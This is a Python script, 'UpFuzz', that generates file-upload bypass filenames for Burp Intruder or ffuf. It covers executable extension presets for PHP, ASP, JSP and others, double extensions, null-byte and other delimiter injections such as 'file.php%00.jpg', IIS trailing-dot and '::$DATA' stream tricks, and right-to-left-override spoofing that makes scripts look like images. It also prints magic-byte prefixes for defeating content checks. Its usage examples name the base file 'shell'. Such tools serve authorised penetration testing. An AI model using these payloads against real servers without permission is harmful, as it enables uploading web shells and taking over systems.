#!/usr/bin/env python3

"""
UpFuzz - Advanced File Upload Bypass Generator
Features:
- Pipe-able output for Burp Intruder/FFUF
- Full filename generation (e.g., 'profile.php.jpg')
- RTLO (Right-to-Left Override) visual spoofing
- IIS/Windows specific bypasses (::$DATA, Trailing dots)
- Helper for Magic Byte signatures
"""

import argparse
import sys

# --- CONFIGURATION ---

# 1. Extension Presets
PRESETS = {
    "php": [
        ".php",
        ".php2",
        ".php3",
        ".php4",
        ".php5",
        ".php6",
        ".php7",
        ".phps",
        ".pht",
        ".phtml",
        ".phar",
        ".pgif",
        ".inc",
    ],
    "asp": [
        ".asp",
        ".aspx",
        ".cer",
        ".asa",
        ".config",
        ".ashx",
        ".asmx",
        ".axd",
        ".cshtm",
    ],
    "jsp": [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action"],
    "coldfusion": [".cfm", ".cfml", ".cfc", ".dbm"],
    "xml": [".xml", ".svg", ".json", ".xsl", ".xslt"],
    "perl": [".pl", ".cgi"],
    "python": [".py", ".pyc"],
    "sh": [".sh", ".bash"],
    # 'web' combines the most common attack vectors
    "web": [".php", ".phtml", ".asp", ".aspx", ".jsp", ".jspx"],
}

# 2. Magic Bytes (Hex Signatures for Burp "Prefix" rules)
MAGIC_BYTES = {
    "jpg": "\\xFF\\xD8\\xFF\\xE0",
    "png": "\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A",
    "gif": "\\x47\\x49\\x46\\x38\\x39\\x61",
    "pdf": "\\x25\\x50\\x44\\x46\\x2D",
    "bmp": "\\x42\\x4D",
}

# 3. Delimiters for Double Extensions
DELIMITERS = ["", "%00", "%0a", "%20", ".", ";", ":", "/", "\\", "_", "-"]

# 4. RTLO Character (Right-to-Left Override)
RTLO_CHAR = "\u202e"

# --- HELPER FUNCTIONS ---


def log(msg):
    """Print to stderr (doesn't corrupt piped output)"""
    sys.stderr.write(f"[+] {msg}\n")


def get_magic_bytes_tip(benign_exts):
    """Returns a tip string about magic bytes for the chosen benign extensions"""
    tips = []
    seen = set()
    for ext in benign_exts:
        clean_ext = ext.lstrip(".")
        if clean_ext in MAGIC_BYTES and clean_ext not in seen:
            tips.append(f"  {clean_ext.upper()}: {MAGIC_BYTES[clean_ext]}")
            seen.add(clean_ext)

    if tips:
        return (
            "\n[TIP] Magic Bytes for Burp Intruder (Payload Processing > Add Prefix):\n"
            + "\n".join(tips)
            + "\n"
        )
    return ""


def generate_payloads(filename, targets, benigns, options):
    """
    Core logic to generate bypass permutations
    """
    payloads = set()

    # Normalize inputs (ensure leading dots)
    mal_list = [x if x.startswith(".") else f".{x}" for x in targets]
    ben_list = [x if x.startswith(".") else f".{x}" for x in benigns]

    for mal in mal_list:
        # A. Basic Payload
        payloads.add(f"{filename}{mal}")

        # B. Case Variations (e.g., .PhP)
        if not options["no_case"]:
            payloads.add(f"{filename}{mal.upper()}")
            # Capitalize first letter (common bypass)
            if len(mal) > 1:
                cap = mal[0] + mal[1:].capitalize()
                payloads.add(f"{filename}{cap}")

        # C. Double Extensions & Delimiters
        for ben in ben_list:
            # 1. Standard double: file.php.jpg / file.jpg.php
            payloads.add(f"{filename}{mal}{ben}")
            payloads.add(f"{filename}{ben}{mal}")

            # 2. Delimiter injection: file.php%00.jpg
            for delim in DELIMITERS:
                if delim:
                    payloads.add(f"{filename}{mal}{delim}{ben}")
                    payloads.add(f"{filename}{ben}{delim}{mal}")

        # D. IIS / Windows Specific Evasion
        # IIS treats "file.asp." and "file.asp " as "file.asp"
        payloads.add(f"{filename}{mal}.")
        payloads.add(f"{filename}{mal} ")
        payloads.add(f"{filename}{mal}%20")

        # NTFS Alternate Data Streams (ADS)
        # "file.asp::$DATA" saves as "file.asp"
        if "php" in mal or "asp" in mal or "config" in mal:
            payloads.add(f"{filename}{mal}::$DATA")

        # E. RTLO Spoofing (Visual Trickery)
        # Creates filenames that look benign in logs/explorer but execute as malicious
        if options["rtlo"]:
            for ben in ben_list:
                # We need to reverse the benign extension string for the visual trick to work
                # Logic: file + [RTLO] + (benign_reversed) + malicious
                # Result: file[RTLO]gpj.php -> Renders visually as filephp.jpg

                clean_ben = ben.lstrip(".")
                rev_ben = clean_ben[::-1]
                payloads.add(f"{filename}{RTLO_CHAR}{rev_ben}{mal}")

    return sorted(list(payloads))


# --- MAIN ---


def main():
    parser = argparse.ArgumentParser(
        description="UpFuzz Pro - The Ultimate File Upload Payload Generator",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  # Generate basic PHP payloads for Burp
  %(prog)s --preset php --filename shell

  # Generate advanced IIS/ASP payloads with RTLO spoofing
  %(prog)s --preset asp --filename strict_check --rtlo

  # Pipe directly to clipboard (Mac/Linux)
  %(prog)s --preset web | pbcopy
        """,
    )

    # Core Arguments
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "--preset", choices=PRESETS.keys(), help="Target language/framework"
    )
    group.add_argument("--custom", help="Custom malicious extensions (comma-separated)")

    parser.add_argument(
        "--filename",
        default="payload",
        help="Base filename to use (default: 'payload')",
    )
    parser.add_argument(
        "--benign",
        default="jpg,png",
        help="Benign extensions to mix in (comma-separated)",
    )
    parser.add_argument("-o", "--output", help="Save output to a specific file")

    # Toggles
    parser.add_argument(
        "--rtlo",
        action="store_true",
        help="Include RTLO (Right-to-Left Override) spoofing payloads",
    )
    parser.add_argument(
        "--no-case", action="store_true", help="Disable case variations (e.g., .PhP)"
    )
    parser.add_argument(
        "--show-magic",
        action="store_true",
        help="Display Magic Byte hex signatures for Burp configuration",
    )

    args = parser.parse_args()

    # 1. Setup Data
    if args.preset:
        targets = PRESETS[args.preset]
    else:
        targets = [x.strip() for x in args.custom.split(",")]

    benigns = [x.strip() for x in args.benign.split(",")]

    options = {"rtlo": args.rtlo, "no_case": args.no_case}

    # 2. Generate
    log(
        f"Generating payloads for '{args.filename}' targeting {len(targets)} extensions..."
    )
    results = generate_payloads(args.filename, targets, benigns, options)

    # 3. Output Handling
    output_content = "\n".join(results)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(output_content)
        log(f"Saved {len(results)} payloads to {args.output}")
    else:
        # Print pure list to stdout
        print(output_content)
        log(f"Generated {len(results)} payloads.")

    # 4. Magic Bytes Helper (sent to stderr)
    if args.show_magic:
        sys.stderr.write(get_magic_bytes_tip(benigns))


if __name__ == "__main__":
    main()
